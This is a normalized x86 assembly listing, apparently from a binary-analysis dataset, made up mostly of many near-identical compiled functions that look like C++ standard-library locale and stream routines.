mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100078da
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_100422bf
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000794c
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
sub_10044826
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10043aaa
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_100448c3
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10043bea
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_10044960
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10043d32
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_100449fd
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10043dea
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_10044a9a
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10043e89
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_10044b37
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10043f28
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_10044bd4
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10044037
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_10044c71
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10043b4b
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_10044d0e
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100440d6
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_10044dab
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10044175
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_10044e48
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10044214
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_10044ee5
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100442d3
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_10044f82
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1004441b
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_1004501f
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100444d3
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_100450bc
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10044572
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_10045159
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10044611
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_100451f6
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100446e8
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_10045293
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10044787
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_10045330
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10043a09
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_100453cd
mov edi edi
push esi
push edi
mov esi ecx
call sub_100358dd
mov edi eax
test edi edi
je r-xdata
cmp [ esi + 0x18 ] 0x0
je r-xdata
push edi
lea ecx [ esi + 0x4 ]
call sub_10001e9f
push edi
call sub_10027a85
pop ecx
mov eax r--data
cmp [ esi + 0x1c ] 0x10
jb r-xdata
lea eax [ esi + 0x8 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
jmp r-xdata
pop edi
pop esi
retn
sub_1004540c
mov edi edi
push esi
push edi
mov esi ecx
call sub_100359e6
mov edi eax
test edi edi
je r-xdata
cmp [ esi + 0x34 ] 0x0
je r-xdata
push edi
lea ecx [ esi + 0x20 ]
call sub_10001e9f
push edi
call sub_10027a85
pop ecx
mov eax r--data
cmp [ esi + 0x38 ] 0x10
jb r-xdata
lea eax [ esi + 0x24 ]
jmp r-xdata
mov eax [ esi + 0x24 ]
jmp r-xdata
pop edi
pop esi
retn
sub_1004544b
push 0x50
mov eax sub_1004ef64
call sub_1002b30f
mov esi [ ebp + 0x14 ]
test [ esi + 0x10 ] 0x4000
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] edi
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx esi
call sub_10007dd5
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_10044e48
pop ecx
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x38 ] eax
call sub_10007dbd
lea ecx [ ebp - 0x2c ]
call sub_100430dd
mov ecx [ ebp - 0x38 ]
xor edi edi
inc edi
lea eax [ ebp - 0x5c ]
mov [ ebp - 0x4 ] edi
push eax
cmp [ ebp + 0x1c ] bl
je r-xdata
movzx edx [ ebp + 0x1c ]
mov eax [ ecx ]
push edx
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call [ eax + 0x1c ]
mov eax edi
jmp r-xdata
call sub_1003f21b
mov [ ebp - 0x4 ] 0x3
call sub_10043240
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
call sub_1002b392
retn 0x18
xor edi edi
cmp eax [ ebp - 0x18 ]
jbe r-xdata
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0x2c ]
call sub_1004334b
push ebx
push edi
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0x1
call sub_10042e00
mov eax [ esi + 0x18 ]
cmp eax ebx
jle r-xdata
cmp [ ebp - 0x14 ] 0x8
mov eax [ ebp - 0x28 ]
jae r-xdata
push edi
push [ ebp + 0x18 ]
lea eax [ ebp - 0x40 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x30 ]
call sub_10042407
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x10 ] eax
xor edi edi
sub eax [ ebp - 0x18 ]
mov edi eax
jmp r-xdata
push [ ebp - 0x18 ]
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0x40 ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x30 ]
call sub_100423d0
mov ecx [ eax ]
push edi
push [ ebp + 0x18 ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ ebp - 0x34 ]
mov [ ebp + 0x10 ] eax
push [ ebp - 0x30 ]
mov [ esi + 0x18 ] ebx
call sub_10042407
add esp 0x30
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10042e00
mov eax [ ebp - 0x34 ]
lea eax [ ebp - 0x28 ]
mov eax [ esi + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
sub_10045594
push 0x16c
mov eax sub_1004f069
call sub_1002b30f
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x18 ]
mov esi [ ebp + 0x8 ]
and [ ebp - 0x70 ] 0x0
cmp [ ebp + 0x14 ] 0x0
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xa4 ] ecx
mov [ ebp - 0x7c ] esi
mov [ ebp - 0x74 ] eax
mov [ ebp - 0xa8 ] edi
mov ecx edi
je r-xdata
lea eax [ ebp - 0xac ]
push eax
call sub_10007dd5
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10044b37
pop ecx
mov ebx eax
mov [ ebp - 0xa0 ] eax
lea ecx [ ebp - 0xac ]
lea eax [ ebp - 0xb0 ]
push eax
call sub_10007dd5
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10044bd4
mov ebx eax
pop ecx
mov [ ebp - 0xa0 ] ebx
lea ecx [ ebp - 0xb0 ]
jmp r-xdata
mov ecx [ ebp - 0x90 ]
cmp ecx 0x4
jae r-xdata
call sub_10007dbd
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x65 ] 0x0
mov [ ebp - 0x75 ] 0x0
call sub_10001bdf
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_10001bdf
mov eax [ ebx ]
lea ecx [ ebp - 0xb4 ]
push ecx
mov ecx ebx
mov [ ebp - 0x70 ] 0x1
call [ eax + 0x24 ]
and [ ebp - 0x90 ] 0x0
jmp r-xdata
cmp [ ebp - 0x65 ] 0x0
jne r-xdata
movsx eax [ ebp + ecx - 0xb4 ]
sub eax 0x20
je r-xdata
mov ecx [ ebp - 0x7c ]
push 0xffffffff
push 0x0
call sub_100022bb
jmp r-xdata
cmp [ ebp - 0x34 ] 0x1
jbe r-xdata
cmp ecx 0x3
je r-xdata
sub eax 0x4
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1000264e
mov eax [ ebp - 0x7c ]
call sub_1002b392
retn 0x14
cmp [ ebp - 0x75 ] 0x0
je r-xdata
and [ ebp - 0x8c ] 0x0
and [ ebp - 0x88 ] 0x0
lea eax [ ebp - 0xc0 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_10009d44
mov ecx [ eax ]
mov [ ebp - 0x8c ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x88 ] eax
jmp r-xdata
inc [ ebp - 0x90 ]
cmp [ ebp - 0x65 ] 0x0
je r-xdata
lea eax [ ebp - 0x88 ]
push eax
mov ecx edi
call sub_10007dd5
push eax
mov [ ebp - 0x4 ] 0xd
call sub_10007a4d
pop ecx
lea ecx [ ebp - 0x88 ]
mov esi eax
mov [ ebp - 0x4 ] 0x3
call sub_10007dbd
mov edi [ ebp - 0x6c ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_1003f21b
test [ edi + 0x10 ] 0x8
mov [ ebp - 0x4 ] 0x4
jne r-xdata
sub eax 0x7
je r-xdata
mov eax [ ebp - 0xa4 ]
add eax 0x8
push eax
push 0x0
push 0x2d
call sub_10007340
mov ecx [ ebp - 0x7c ]
add esp 0xc
movzx eax ax
push eax
push 0x1
push 0x0
call sub_100432ab
lea eax [ ebp - 0x98 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_10007e38
push eax
lea ecx [ ebp - 0x8c ]
call sub_10006d3f
mov ecx eax
call sub_10006cba
test al al
jne r-xdata
mov ebx [ ebp - 0xa0 ]
mov edi [ ebp - 0xa8 ]
push [ ebp - 0x74 ]
push edi
call sub_1000674b
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ ebp - 0x90 ] 0x3
jne r-xdata
cmp [ ebp - 0x14 ] 0x8
mov esi [ ebp - 0x28 ]
jae r-xdata
push [ ebp - 0x74 ]
mov ecx [ ebp - 0x6c ]
call sub_100068a0
test al al
jne r-xdata
sub eax 0x4b
je r-xdata
push [ ebp - 0x74 ]
push [ ebp - 0x6c ]
call sub_1000674b
pop ecx
pop ecx
test al al
je r-xdata
lea eax [ ebp - 0xc0 ]
push eax
lea ecx [ ebp - 0x48 ]
call sub_10007e38
push eax
lea ecx [ ebp - 0x8c ]
call sub_10006cba
test al al
je r-xdata
mov ecx edi
call sub_10005f4d
mov edx [ esi ]
movzx eax ax
push eax
push 0x48
mov ecx esi
call [ edx + 0x8 ]
test al al
je r-xdata
lea eax [ ebp - 0xd0 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10009d44
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x98 ] ecx
mov [ ebp - 0x94 ] eax
jmp r-xdata
cmp [ ebp - 0x34 ] 0x1
ja r-xdata
mov ecx [ ebp - 0x6c ]
call sub_10005f4d
cmp ax [ esi ]
jne r-xdata
lea esi [ ebp - 0x28 ]
lea eax [ ebp - 0x124 ]
push eax
mov ecx ebx
call sub_10043240
or [ ebp - 0x70 ] 0x2
cmp [ eax + 0x14 ] 0x0
mov [ ebp - 0x4 ] 0x5
jbe r-xdata
mov eax [ ebx ]
xor esi esi
mov ecx ebx
mov [ ebp - 0x84 ] esi
call [ eax + 0x1c ]
mov [ ebp - 0x9c ] eax
mov eax [ ebp - 0xa4 ]
add eax 0x8
push eax
push esi
push 0x30
call sub_10007340
movzx eax ax
mov [ ebp - 0x80 ] eax
add esp 0xc
lea eax [ ebp - 0x64 ]
push eax
mov ecx ebx
call sub_10043163
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x50 ] esi
je r-xdata
dec eax
dec eax
jne r-xdata
lea ecx [ ebp - 0x8c ]
call sub_10006f37
mov ecx [ ebp - 0x6c ]
mov esi eax
call sub_10005f4d
cmp ax [ esi ]
jne r-xdata
mov ecx edi
call sub_10006020
push [ ebp - 0x74 ]
push [ ebp - 0x6c ]
call sub_1000674b
pop ecx
pop ecx
test al al
jne r-xdata
push [ ebp - 0x74 ]
mov ecx [ ebp - 0x6c ]
call sub_100068a0
test al al
jne r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_100022bb
mov [ ebp - 0x76 ] 0x0
lea eax [ ebp - 0xec ]
push eax
mov ecx ebx
call sub_10043240
or [ ebp - 0x70 ] 0x4
push 0x0
mov ecx eax
mov [ ebp - 0x4 ] 0x6
call sub_100230f0
